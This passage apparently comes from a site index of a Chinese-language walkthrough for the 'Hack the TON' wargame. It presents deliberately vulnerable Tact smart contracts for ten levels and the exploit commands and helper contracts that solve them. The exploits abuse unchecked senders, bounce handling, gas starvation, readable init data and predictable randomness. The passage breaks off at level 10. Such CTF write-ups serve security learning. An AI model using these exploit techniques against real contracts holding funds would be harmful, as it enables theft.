TON\uff0c\u9996\u5148\u5411\u5408\u7ea6\u53d1\u9001 TON \u4ee5\u6210\u4e3a\u6240\u6709\u8005 1 2 3 > await player . send ({ to : contract . address . toString (), value : toNano ( \"0.05\" )}); // or > await contract . send ( player , { value : toNano ( 0.05 )}, null ); \u4f7f\u7528 withdraw \u53d6\u51fa\u5408\u7ea6\u4e2d\u6240\u6709\u7684\u8d44\u91d1 1 > await contract . send ( player , { value : toNano ( 0.05 )}, \"withdraw\" );","title":"1. DEPOSIT"},{"location":"wargames/hack_the_ton/#2-scanner","text":"Claim ownership of the contract below to complete this level. ScannerLevel 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 import \"@stdlib/ownable\" ; import \"@stdlib/deploy\" ; import \"./messages\" ; contract Child with Deployable { parent : Address ; nonce : Int ; init ( parent : Address , nonce : Int ) { self . parent = parent ; self . nonce = nonce ; } } message SendChildAddress { address : Address ; } contract ScannerLevel with Ownable , Deployable { owner : Address ; player : Address ; nonce : Int ; child : Address ; init ( player : Address , nonce : Int ) { self . owner = sender (); self . player = player ; self . nonce = nonce ; let level_init : StateInit = initOf Child ( myAddress (), nonce ); self . child = contractAddress ( level_init ); send ( SendParameters { to : self . child , value : ton ( \"0.01\" ), mode : SendPayGasSeparately , bounce : false , data : level_init . data , code : level_init . code , body : Deploy { queryId : 0 , }. toCell () }); } receive ( msg : SendChildAddress ) { require ( msg . address == self . child , \"Wrong child address.\" ); self . owner = sender (); } receive ( \"check\" ) { send ( SendParameters { to : sender (), value : 0 , mode : SendRemainingValue , bounce : false , body : CheckLevelResult { name : \"scanner\" , completed : self . owner == self . player }. toCell () }); } } \u8981\u6210\u4e3a\u5408\u7ea6\u7684\u6240\u6709\u8005\u9700\u8981\u77e5\u9053 Child \u5408\u7ea6\u7684\u5730\u5740\uff0c\u53ef\u4ee5\u901a\u8fc7 Tonviewer \u67e5\u770b ScannerLevel \u90e8\u7f72\u7684\u4ea4\u6613\u6765\u83b7\u77e5 \u53d1\u9001 Child \u5408\u7ea6\u5730\u5740 1 > await contract . send ( player , { value : toNano ( \"0.05\" )}, { $$type : \"SendChildAddress\" , address : Address . parse ( \"kQDjT2mQ8ePcmYsBMQDi4JJHPzZNU1nqe_KbqIOwUKZaCX2Z\" )});","title":"2. SCANNER"},{"location":"wargames/hack_the_ton/#3-bounce","text":"Claim ownership of the contract below to complete this level. BounceLevel 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 import \"@stdlib/ownable\" ; import \"@stdlib/deploy\" ; import \"./messages\" ; message Start { time : Int as uint32 ; } message Finish { time : Int as uint32 ; } contract Timer with Deployable { parent : Address ; nonce : Int ; startTime : Int ? as uint32 ; init ( parent : Address , nonce : Int ) { self . parent = parent ; self . nonce = nonce ; } receive ( msg : Start ) { self . startTime = msg . time ; } receive ( msg : Finish ) { if ( self . startTime == null ) { return ; } require ( msg . time - self . startTime !! < 180 , \"Too late.\" ); self . startTime = null ; } } contract BounceLevel with Ownable , Deployable { owner : Address ; player : Address ; nonce : Int ; timer : Address ; init ( player : Address , nonce : Int ) { self . owner = sender (); self . player = player ; self . nonce = nonce ; let level_init : StateInit = initOf Timer ( myAddress (), nonce ); self . timer = contractAddress ( level_init ); send ( SendParameters { to : self . timer , value : ton ( \"0.01\" ), bounce : false , data : level_init . data , code : level_init . code }); } receive ( \"start\" ) { send ( SendParameters { to : self . timer , value : 0 , bounce : true , mode : SendRemainingValue , body : Start { time : now () }. toCell () }); } receive ( \"finish\" ) { send ( SendParameters { to : self . timer , value : 0 , bounce : true , mode : SendRemainingValue , body : Finish { time : now () }. toCell () }); } bounced ( _ : Slice ) { self . owner = self . player ; } receive ( \"check\" ) { send ( SendParameters { to : sender (), value : 0 , mode : SendRemainingValue , bounce : false , body : CheckLevelResult { name : \"bounce\" , completed : self . owner == self . player }. toCell () }); } } \u5408\u7ea6 BounceLevel \u6536\u5230\u5f39\u56de\u7684\u6d88\u606f\u540e\u5c31\u4f1a\u5c06\u73a9\u5bb6\u8bbe\u4e3a\u5408\u7ea6\u6240\u6709\u8005 \u53ea\u9700\u8981\u5728\u53d1\u9001\u5b8c start \u7684\u4e09\u5206\u949f\u540e\u5411 BounceLevel \u53d1\u9001 finish \uff0c\u8ba9\u5408\u7ea6 Timer \u629b\u51fa\u9519\u8bef\u5f39\u56de\u6d88\u606f\u5373\u53ef \u6216\u76f4\u63a5\u5411 Timer \u53d1\u9001 start \u8bbe\u7f6e\u81ea\u5b9a\u4e49\u5f00\u59cb\u65f6\u95f4 1 2 3 4 5 6 > await contract . send ( player , { value : toNano ( '0.05' )}, \"start\" ); // or > await player . send ({ to : Address . parse ( \"kQCmY8KG3F2y-2Unxl2jMtJMIUjT9fWhqXWM37hPHWbnPIjp\" ), value : toNano ( \"0.01\" ), body : beginCell (). storeUint ( 1141136470 , 32 ). storeUint ( 0 , 32 ). endCell ()}); // opcode: sha256(\"Start{time:uint32}\") >> 224 > await contract . send ( player , { value : toNano ( '0.05' )}, \"finish\" );","title":"3. BOUNCE"},{"location":"wargames/hack_the_ton/#references_1","text":"tact-lang / tact","title":"References"},{"location":"wargames/hack_the_ton/#4-intruder","text":"Claim ownership of the contract below to complete this level. IntruderLevel 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 import \"@stdlib/deploy\" ; import \"./messages\" ; message ( 0x6e38a063 ) ChangeLevelOwner { newOwner : Address ; } message ( 0x6f13c225 ) ChangeClientOwner { newOwner : Address ; } message ( 0xa4e501ef ) ChangeOwnerInternal { newOwner : Address ; } contract Manager with Deployable { client : Address ; nonce : Int ; init ( client : Address , nonce : Int ) { self . client = client ; self . nonce = nonce ; } receive ( msg : ChangeClientOwner ) { send ( SendParameters { to : self . client , value : 0 , bounce : false , mode : SendRemainingValue , body : ChangeOwnerInternal { newOwner : msg . newOwner }. toCell () }); } } contract IntruderLevel with Deployable { owner : Address ; player : Address ; nonce : Int ; manager : Address ; init ( player : Address , nonce : Int ) { self . owner = sender (); self . player = player ; self . nonce = nonce ; let level_init : StateInit = initOf Manager ( myAddress (), nonce ); self . manager = contractAddress ( level_init ); send ( SendParameters { to : self . manager , value : ton ( \"0.01\" ), bounce : false , data : level_init . data , code : level_init . code }); } receive ( msg : ChangeLevelOwner ) { require ( sender () == self . owner , \"Wrong sender.\" ); send ( SendParameters { to : self . manager , value : 0 , bounce : false , mode : SendRemainingValue , body : ChangeClientOwner { newOwner : msg . newOwner }. toCell () }); } receive ( msg : ChangeOwnerInternal ) { require ( sender () == self . manager , \"Wrong sender.\" ); self . owner = msg . newOwner ; } receive ( \"check\" ) { send ( SendParameters { to : sender (), value : 0 , mode : SendRemainingValue , bounce : false , body : CheckLevelResult { name : \"intruder\" , completed : self . owner == self . player }. toCell () }); } get fun owner () : Address { return self . owner ; } } \u53ea\u6709 manager \u80fd\u8bbe\u7f6e\u5408\u7ea6\u7684\u6240\u6709\u8005\uff0c\u800c\u521d\u59cb manager \u4e3a Manager \u5408\u7ea6 \u5408\u7ea6 Manager \u4e0d\u68c0\u67e5 ChangeClientOwner \u6d88\u606f\u7684\u53d1\u9001\u8005 1 2 3 message ( 0x6f13c225 ) ChangeClientOwner { newOwner : Address ; } \u53ef\u4ee5\u5411 Manager \u5408\u7ea6\u53d1\u9001 ChangeClientOwner \u6d88\u606f\u6765\u8bbe\u7f6e IntruderLevel \u5408\u7ea6\u7684\u6240\u6709\u8005 1 > await player . send ({ to : Address . parse ( \"kQCi5Sne638i1fdoGMK7cnKPVuQWgyGO4N4LxneLonWwvgZ_\" ), value : toNano ( \"0.01\" ), body : beginCell (). storeUint ( 0x6f13c225 , 32 ). storeAddress ( player . address ). endCell ()});","title":"4. INTRUDER"},{"location":"wargames/hack_the_ton/#5-partial","text":"The goal of this level is to hack the vault contract below. You are given 100 tokens to start with and you will beat the level if you manage to acquire 1000 or more. PartialLevel 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 import \"@stdlib/ownable\" ; import \"@stdlib/deploy\" ; import \"./messages\" ; message DepositToVault { amount : Int as coins ; } message WithdrawFromVault { amount : Int as coins ; } message DepositInternal { amount : Int as coins ; } message WithdrawInternal { amount : Int as coins ; } contract Vault with Ownable , Deployable { owner : Address ; nonce : Int ; balance : Int as coins = 500 ; init ( owner : Address , nonce : Int ) { self . owner = owner ; self . nonce = nonce ; } receive ( msg : DepositInternal ) { self . requireOwner (); self . balance += msg . amount ; } receive ( msg : WithdrawInternal ) { self . requireOwner (); require ( self . balance >= msg . amount , \"Not enough balance.\" ); self . balance -= msg . amount ; } get fun balance () : Int { return self . balance ; } } contract PartialLevel with Deployable { player : Address ; nonce : Int ; vault : Address ; balance : Int as coins = 100 ; init ( player : Address , nonce : Int ) { self . player = player ; self . nonce = nonce ; let level_init : StateInit = initOf Vault ( myAddress (), nonce ); self . vault = contractAddress ( level_init ); send ( SendParameters { to : self . vault , value : ton ( \"0.01\" ), bounce : false , data : level_init . data , code : level_init . code }); } receive ( msg : DepositToVault ) { require ( self . balance >= msg . amount , \"Not enough balance.\" ); self . balance -= msg . amount ; send ( SendParameters { to : self . vault , value : 0 , bounce : false , mode : SendRemainingValue , body : DepositInternal { amount : msg . amount }. toCell () }); } receive ( msg : WithdrawFromVault ) { self . balance += msg . amount ; send ( SendParameters { to : self . vault , value : 0 , bounce : true , mode : SendRemainingValue , body : WithdrawInternal { amount : msg . amount }. toCell () }); } bounced ( msg : WithdrawInternal ) { self . balance -= msg . amount ; } receive ( \"check\" ) { send ( SendParameters { to : sender (), value : 0 , mode : SendRemainingValue , bounce : false , body : CheckLevelResult { name : \"partial\" , completed : self . balance >= 1000 }. toCell () }); } get fun balance () : Int { return self . balance ; } } \u901a\u8fc7 WithdrawFromVault \u53ef\u4ee5\u589e\u52a0\u5408\u7ea6\u7684\u4f59\u989d\uff0c\u4f46\u82e5 WithdrawInternal \u6267\u884c\u5931\u8d25\uff0c\u5c06\u56de\u5f39\u6d88\u606f\u5e76\u56de\u6eda\u4f59\u989d 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 contract Vault with Ownable , Deployable { // [...] receive ( msg : WithdrawInternal ) { self . requireOwner (); require ( self . balance >= msg . amount , \"Not enough balance.\" ); self . balance -= msg . amount ; } // [...] } contract PartialLevel with Deployable { // [...] receive ( msg : WithdrawFromVault ) { self . balance += msg . amount ; send ( SendParameters { to : self . vault , value : 0 , bounce : true , mode : SendRemainingValue , body : WithdrawInternal { amount : msg . amount }. toCell () }); } bounced ( msg : WithdrawInternal ) { self . balance -= msg . amount ; } // [...] } \u5728 TON \u4e2d\uff0c \u5982\u679c\u652f\u4ed8\u7684\u8d39\u7528\u4e0d\u8db3\u4ee5\u5b8c\u6210\u6267\u884c\uff0c\u5219\u4e0d\u4f1a\u521b\u5efa\u56de\u5f39\u6d88\u606f\u3002\u56e0\u6b64\u53ea\u9700\u8981\u652f\u4ed8\u4ec5\u4f9b WithdrawFromVault \u6267\u884c\u7684\u8d39\u7528\uff0c\u4f7f\u4f59\u989d\u589e\u52a0\u5373\u53ef 1 2 > await contract . send ( player , { value : toNano ( \"0.005\" )}, { $$type : \"WithdrawFromVault\" , amount : 900 }); // https://testnet.tonviewer.com/transaction/407df39b95d852f44d1b1a9b8176bc68a44701bc2afabd7b069110faba553a5f","title":"5. PARTIAL"},{"location":"wargames/hack_the_ton/#references_2","text":"Internal message","title":"References"},{"location":"wargames/hack_the_ton/#6-peek","text":"Unlock the contract below to complete this level. PeekLevel 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 import \"@stdlib/deploy\" ; import \"../messages\" ; message Unlock { password : Int as uint32 ; } contract PeekLevel with Deployable { player : Address ; nonce : Int ; password : Int as uint32 ; locked : Bool = true ; init ( player : Address , nonce : Int , password : Int ){ self . player = player ; self . nonce = nonce ; self . password = password ; } receive ( msg : Unlock ){ require ( msg . password == self . password , \"Wrong password.\" ); self . locked = false ; } receive ( \"check\" ){ send ( SendParameters { to : sender (), value : 0 , mode : SendRemainingValue , bounce : false , body : CheckLevelResult { name : \"peek\" , completed : ! self . locked }. toCell () } ); } get fun locked () : Bool { return self . locked ; } } \u63d0\u4f9b\u6b63\u786e\u7684\u5bc6\u7801\u5373\u53ef\u89e3\u9501\uff0c\u9700\u8981\u89e3\u6790 \u521d\u59cb\u5316\u6d88\u606f \u90e8\u7f72 Tact \u7f16\u5199\u7684\u5408\u7ea6\uff0c\u51fd\u6570 init() \u7684\u53c2\u6570\u5305\u542b\u5728 init data \u4e2d\uff0c\u5e76\u5c06\u5728\u90e8\u7f72\u9644\u5e26\u7684\u7b2c\u4e00\u6b21\u5408\u7ea6\u8c03\u7528\u4e2d\u6839\u636e init data \u66f4\u65b0\u5b58\u50a8 \u4f7f\u7528 pytoniq-core \u89e3\u6790\u521d\u59cb\u6570\u636e \u5c3d\u7ba1\u53ef\u4ee5\u4f7f\u7528\u8f83\u5c0f\u7684 Int \u8868\u793a\u5f62\u5f0f\u6765\u51cf\u5c11\u5b58\u50a8\u5f00\u9500\uff0c\u4f46 TVM \u4ec5\u5bf9 257 \u4f4d\u6574\u578b\u8fdb\u884c\u64cd\u4f5c\u3002\u56e0\u6b64\uff0cinit data \u4e2d\u7684\u6574\u578b\u53c2\u6570\u5747\u4e3a 257 \u4f4d\u6709\u7b26\u53f7\u6574\u6570 1 2 3 4 5 6 7 8 9 10 11 12 from pytoniq_core import Cell , Slice init = Cell . one_from_boc ( 'b5ee9c720102120100034600020134040101c340007a7155b50ef485eb69331e4e6a963457a71a0d34a960e74e38724741ddb27b00000000000000000000000000000000000000000000000000000000000000005800000000000000000000000000000000000000000000000000000000abad86ee020101c0030105a1a75f040114ff00f4a413f4bcf2c80b05020162060702ead001d0d3030171b0a301fa400120d74981010bbaf2e08820d70b0a208104ffbaf2d0898309baf2e088545053036f04f86102f862db3c5513db3cf2e082c8f84301cc7f01ca005530504320d74981010bbaf2e08820d70b0a208104ffbaf2d0898309baf2e088cf16810101cf0012cb1fca00c9ed540f080201200d0e02eeeda2edfb0192307fe07021d749c21f953020d70b1fde2082102194da8eba8e1c30d31f0182102194da8ebaf2e081d31f0131816dde3222baf2f4707fe0208210946a98b6ba8ea830d31f018210946a98b6baf2e081d33f0131c8018210aff90f5758cb1fcb3fc9f84201706ddb3c7fe0c0009130e30d70090a013a6d6d226eb3995b206ef2d0806f22019132e2102470030480425023db3c0b01aef90182f0b92ab1b3504a092e6e10b90beb85a7ceb990452ba73c09375bf2dd2a56cbcf7fba8eaff842708040708b47065656b825c000c85982106df37b4d5003cb1fc858cf16c901ccca00c91443306d6ddb3c7fdb31e00b01cac87101ca01500701ca007001ca02500520d74981010bbaf2e08820d70b0a208104ffbaf2d0898309baf2e088cf165003fa027001ca68236eb3917f93246eb3e2973333017001ca00e30d216eb39c7f01ca0001206ef2d08001cc95317001ca00e2c901fb000c00987f01ca00c87001ca007001ca00246eb39d7f01ca0004206ef2d0805004cc9634037001ca00e2246eb39d7f01ca0004206ef2d0805004cc9634037001ca00e27001ca00027f01ca0002c958cc0211becdbed9e6d9e3620c0f100011be15f76a268690000c01eced44d0d401f863d200018e2dfa400120d74981010bbaf2e08820d70b0a208104ffbaf2d0898309baf2e08801810101d700d31fd20055306c14e0f828d70b0a8309baf2e089fa400120d74981010bbaf2e08820d70b0a208104ffbaf2d0898309baf2e08801810101d700810101d700552003d158db3c1100022000027f' ) init_slice = init . begin_parse () init_slice . load_ref () # skip init code init_data = init_slice . load_ref () data_slice = init_data . begin_parse () data_slice . load_ref () # skip tact context system data_slice . load_int ( 1 ) # skip init status data_slice . load_address () # player data_slice . load_int ( 257 ) # nonce print ( data_slice . load_int ( 257 )) # password \u53d1\u9001\u89e3\u9501\u6d88\u606f 1 > await contract . send ( player , { value : toNano ( \"0.005\" )}, { $$type : \"Unlock\" , password : 720069051 });","title":"6. PEEK"},{"location":"wargames/hack_the_ton/#references_3","text":"yungwine / pytoniq-core Serialization","title":"References"},{"location":"wargames/hack_the_ton/#7-swap","text":"You will beat the level if you manage to acquire tokens amount equivalent to 1000 TON or more. SwapLevel 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 144 145 146 147 148 149 150 151 152 153 154 155 156 import \"@stdlib/ownable\" ; import \"@stdlib/deploy\" ; import \"../messages\" ; message SwapTonToTokens { amount : Int as coins ; } message RequestBalance { sender : Address ; } message ResponseBalance { sender : Address ; balance : Int as coins ; } contract Token with Ownable , Deployable { owner : Address ; nonce : Int ; balance : Int as coins = 0 ; init ( owner : Address , nonce : Int ){ self . owner = owner ; self . nonce = nonce ; } receive ( msg : SwapTonToTokens ){ self . requireOwner (); self . balance += msg . amount ; send ( SendParameters { to : sender (), value : 0 , bounce : false , mode : SendRemainingValue , body : \"send ton\" . asComment () } ); } receive ( \"swap tokens to ton\" ){ self . requireOwner (); self . balance = 0 ; send ( SendParameters { to : sender (), bounce : true , value : 0 , mode : SendRemainingBalance + SendIgnoreErrors } ); } receive ( msg : RequestBalance ){ send ( SendParameters { to : sender (), value : 0 , mode : SendRemainingValue , bounce : false , body : ResponseBalance { sender : msg . sender , balance : self . balance }. toCell () } ); } get fun balance () : Int { return self . balance ; } } contract SwapLevel with Deployable { player : Address ; nonce : Int ; token : Address ; init ( player : Address , nonce : Int ){ self . player = player ; self . nonce = nonce ; let token_init : StateInit = initOf Token ( myAddress (), nonce ); self . token = contractAddress ( token_init ); send ( SendParameters { to : self . token , value : ton ( \"0.01\" ), bounce : false , data : token_init . data , code : token_init . code } ); } receive (){} receive ( \"swap ton to tokens\" ){ send ( SendParameters { to : self . token , value : 0 , bounce : false , mode : SendRemainingValue , body : SwapTonToTokens { amount : myBalance () - context (). value }. toCell () }); } receive ( \"swap tokens to ton\" ){ send ( SendParameters { to : self . token , value : 0 , bounce : false , mode : SendRemainingValue , body : \"swap tokens to ton\" . asComment () } ); } receive ( \"send ton\" ){ require ( sender () == self . token , \"Wrong sender.\" ); send ( SendParameters { to : self . token , bounce : true , value : 0 , mode : SendRemainingBalance + SendIgnoreErrors } ); } receive ( \"withdraw\" ){ send ( SendParameters { to : self . player , bounce : true , value : 0 , mode : SendRemainingBalance + SendIgnoreErrors } ); } receive ( \"check\" ){ send ( SendParameters { to : self . token , value : 0 , mode : SendRemainingValue , bounce : false , body : RequestBalance { sender : sender ()}. toCell () } ); } receive ( msg : ResponseBalance ){ require ( sender () == self . token , \"Wrong sender.\" ); send ( SendParameters { to : msg . sender , value : 0 , mode : SendRemainingValue , bounce : false , body : CheckLevelResult { name : \"swap\" , completed : msg . balance >= ton ( \"1000\" ) }. toCell () } ); } } \u64cd\u4f5c swap ton to tokens \u6bcf\u6b21\u80fd\u4f7f Token \u7684 balance \u589e\u52a0 myBalance() - context().value \uff0c\u5373\u5408\u7ea6 SwapLevel \u6301\u6709\u7684 TON \u8d8a\u591a\uff0c\u6bcf\u6b21\u7684\u589e\u52a0\u91cf\u8d8a\u5927\u3002\u5411\u5408\u7ea6 SwapLevel \u53d1\u9001 TON \u589e\u52a0\u5176\u4f59\u989d\u4ee5\u51cf\u5c11\u64cd\u4f5c\u7684\u6b21\u6570 1 await contract . send ( player , { value : toNano ( \"4\" )}, null ); \u5408\u7ea6 Token \u6267\u884c\u64cd\u4f5c SwapTonToTokens \u65f6\uff0c\u4f1a\u5411\u5408\u7ea6 SwapLevel \u53d1\u9001 send ton \u6d88\u606f\uff0c\u4f7f\u5176\u5c06\u6240\u6301\u6709\u7684\u5168\u90e8 TON \u53d1\u9001\u7ed9\u5408\u7ea6 Token \u3002\u9700\u8981\u63a7\u5236 swap ton to tokens \u6d88\u606f\u9644\u5e26\u7684 TON\uff0c\u4f7f\u5408\u7ea6 SwapLevel \u65e0\u6cd5\u5c06\u4f59\u989d\u53d1\u9001\u7ed9\u5408\u7ea6 Token \u3002\u7ecf\u6d4b\u8bd5\uff0c\u53ef\u4ee5\u4f7f\u7528 0.008 TON 1 > await contract . send ( player , { value : toNano ( \"0.008\" )}, \"swap ton to tokens\" ); \u4f7f\u7528 TON Web IDE \u90e8\u7f72 \u8f85\u52a9\u5408\u7ea6 \uff0c\u6279\u91cf\u53d1\u9001\u6d88\u606f \u5168\u5c40\u8bbe\u7f6e\u4e2d\u53ef\u4ee5\u4fee\u6539\u6d88\u606f\u9644\u5e26\u7684 TON \u6570\u91cf 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 import \"@stdlib/deploy\" ; message Swap { cnt : Int as uint32 ; target : Address ; } contract MultiMessageSender with Deployable { // example args: {cnt: 1000, value: 1 TON} receive ( msg : Swap ) { repeat ( msg . cnt ) { send ( SendParameters { to : msg . target , value : ton ( \"0.008\" ), mode : SendDefaultMode + SendPayGasSeparately , body : \"swap ton to tokens\" . asComment () }); } } } \u68c0\u67e5\u7ed3\u675f\u540e\u53d6\u56de\u5408\u7ea6\u4e2d\u7684 TON 1 2 > await contract . send ( player , { value : toNano ( \"0.008\" )}, \"swap tokens to ton\" ); > await contract . send ( player , { value : toNano ( \"0.005\" )}, \"withdraw\" );","title":"7. SWAP"},{"location":"wargames/hack_the_ton/#8-coin","text":"To complete the level, guess 10 times in a row which side the coin will land on. CoinLevel 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 import \"@stdlib/deploy\" ; import \"../messages\" ; message Flip { side : Bool ; } contract Contract { nonce : Int ; init ( nonce : Int ){ self . nonce = nonce ; } } contract CoinLevel with Deployable { player : Address ; nonce : Int ; consecutiveWins : Int = 0 ; flipsCount : Int = 0 ; init ( player : Address , nonce : Int ){ self . player = player ; self . nonce = nonce ; } receive ( msg : Flip ){ let init : StateInit = initOf Contract ( self . flipsCount ); let contractAddress : Address = contractAddress ( init ); let side = contractAddress . asSlice (). asCell (). hash () % 2 == 0 ; self . consecutiveWins = msg . side == side ? self . consecutiveWins + 1 : 0 ; self . flipsCount += 1 ; } receive ( \"check\" ){ send ( SendParameters { to : sender (), value : 0 , mode : SendRemainingValue , bounce : false , body : CheckLevelResult { name : \"coin\" , completed : self . consecutiveWins >= 10 }. toCell () } ); } get fun consecutiveWins () : Int { return self . consecutiveWins ; } get fun flipsCount () : Int { return self . flipsCount ; } } \u9700\u8981\u8fde\u7eed\u731c\u5bf9 10 \u6b21\uff0c\u501f\u52a9\u8f85\u52a9\u5408\u7ea6\u9884\u6d4b\u7ed3\u679c\u5e76\u53d1\u9001\u6d88\u606f \u9898\u76ee\u5408\u7ea6\u4f7f\u7528\u7684 Tact \u7f16\u8bd1\u5668\u7248\u672c\u4e3a 1.4.4\u3002\u4e0d\u540c\u7f16\u8bd1\u5668\u7248\u672c\u53ef\u80fd\u4ea7\u751f\u4e0d\u540c\u7684\u7f16\u8bd1\u7ed3\u679c\uff0c\u6700\u597d \u4f7f\u7528\u76f8\u540c\u7248\u672c\u7684\u7f16\u8bd1\u5668 \uff0c\u4fdd\u8bc1 initOf \u5728\u8f85\u52a9\u5408\u7ea6\u4e2d\u7684\u8ba1\u7b97\u7ed3\u679c\u4e0e\u5b9e\u4f8b\u5408\u7ea6\u76f8\u540c 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 import \"@stdlib/deploy\" ; message Flip { side : Bool ; } message Guess { cnt : Int as uint32 ; start : Int as uint32 ; target : Address ; } contract Contract { nonce : Int ; init ( nonce : Int ){ self . nonce = nonce ; } } contract Guesser with Deployable { receive ( msg : Guess ) { let p : Int = msg . start ; while ( p < msg . start + msg . cnt ) { let init : StateInit = initOf Contract ( p ); let contractAddress : Address = contractAddress ( init ); let side : Bool = contractAddress . asSlice (). asCell (). hash () % 2 == 0 ; send ( SendParameters { to : msg . target , value : ton ( \"0.01\" ), mode : SendDefaultMode + SendPayGasSeparately , body : Flip { side : side }. toCell () }); p += 1 ; } } }","title":"8. COIN"},{"location":"wargames/hack_the_ton/#9-gatekeeper","text":"Unlock the contract below to complete this level. GatekeeperLevel 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 import \"@stdlib/deploy\" ; import \"../messages\" ; message Unlock { a : Int ; b : Int ; } contract GatekeeperLevel with Deployable { player : Address ; nonce : Int ; locked : Bool = true ; init ( player : Address , nonce : Int ){ self . player = player ; self . nonce = nonce ; } receive ( msg : Unlock ){ require (( sender (). asSlice (). asCell (). hash () ^ (( msg . a << 2 ) + msg . b )) == myAddress (). asSlice (). asCell (). hash (), \"Check failed.\" ); self . locked = false ; } receive ( \"check\" ){ send ( SendParameters { to : sender (), value : 0 , mode : SendRemainingValue , bounce : false , body : CheckLevelResult { name : \"gatekeeper\" , completed : ! self . locked }. toCell () } ); } get fun locked () : Bool { return self . locked ; } } \u89e3\u9501\u9700\u8981 sender().asSlice().asCell().hash() ^ ((msg.a << 2) + msg.b) \u7684\u503c\u4e0e myAddress().asSlice().asCell().hash() \u76f8\u7b49 \u83b7\u53d6\u5b9e\u4f8b\u5730\u5740\u7684\u54c8\u5e0c\u503c 1 2 > beginCell (). storeAddress ( contract . address ). endCell (). hash (). toHex () 3036979211 fd86c13a1113af157f701ea19eafb8e1d1c36d761c5ff41c99bc80 \u7531\u4e8e a \u548c b \u6ca1\u6709\u9650\u5236\u8303\u56f4\uff0c\u53ef\u4ee5\u76f4\u63a5\u5c06 a \u8bbe\u7f6e\u4e3a 0\uff0c b \u4e3a\u53d1\u9001\u8005\u5730\u5740\u54c8\u5e0c\u503c\u4e0e\u5b9e\u4f8b\u5730\u5740\u54c8\u5e0c\u503c\u5f02\u6216\u7684\u7ed3\u679c 1 > await contract . send ( player , { value : toNano ( '0.01' )}, { $$type : 'Unlock' , a : 0n , b : 86130810477776835231294161513457632144148633294017539526014373747458502429745n });","title":"9. GATEKEEPER"},{"location":"wargames/hack_the_ton/#10-brute-force","text":"Unlock the contract below to complete this level. BruteforceLevel 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 import \"@stdlib/deploy\" ; import \"../messages\" ; message Unlock { a : Int ; b : Int ; c : Int ; d : Int ; } contract BruteforceLevel with Deployable { player : Address ; nonce : Int ; locked : Bool = true ; x : Int as uint8 = 0 ; y : Int as uint8 = 0 ; init ( player : Address , nonce : Int ){ self . player = player ; self . nonce = nonce ; } receive ( msg : Unlock ){ self . x = msg . a + msg . c ; self . y = msg . b + msg . d ; require (( self . x + self . y ) == 2 , \"First check failed.\" ); require (((( pow ( msg . a , 25 ) + pow ( msg . b , 25 )) + pow ( msg . c , 25 )) + pow ( msg . d , 25 )) == 1968172103452999492963878188028555943794336458502883276710491621054698698752 , \"Second check failed.\" ); self . locked = false ; } receive ( \"check\" ){ send ( SendParameters { to : sender (), value : 0 , mode : SendRemainingValue , bounce : false , body : CheckLevelResult { name : \"bruteforce\" , completed : ! self . locked }. toCell () } ); } get fun locked () : Bool { return self . locked ; } } \u89e3\u9501\u9700\u8981\u63d0\u4f9b\u6ee1\u8db3\u7279\u5b9a\u6761\u4ef6\u7684\u56db\u4e2a\u6574\u6570 (self.x + self.y) == 2 \u5373 msg.a + msg.b + msg.c + msg.d == 2 \uff0c\u8bf4\u660e\u6b63\u8d1f\u6574\u6570\u7684\u7edd\u5bf9\u503c\u4e4b\u5dee\u4e3a 2\uff0c\u4e14 msg.a + msg.c \u548c msg.b + msg.d \u7684\u7ed3\u679c\u5728 8 \u4f4d\u65e0\u7b26\u53f7\u6574\u578b\u7684\u8303\u56f4\u5185 (((pow(msg.a, 25) + pow(msg.b, 25)) + pow(msg.c, 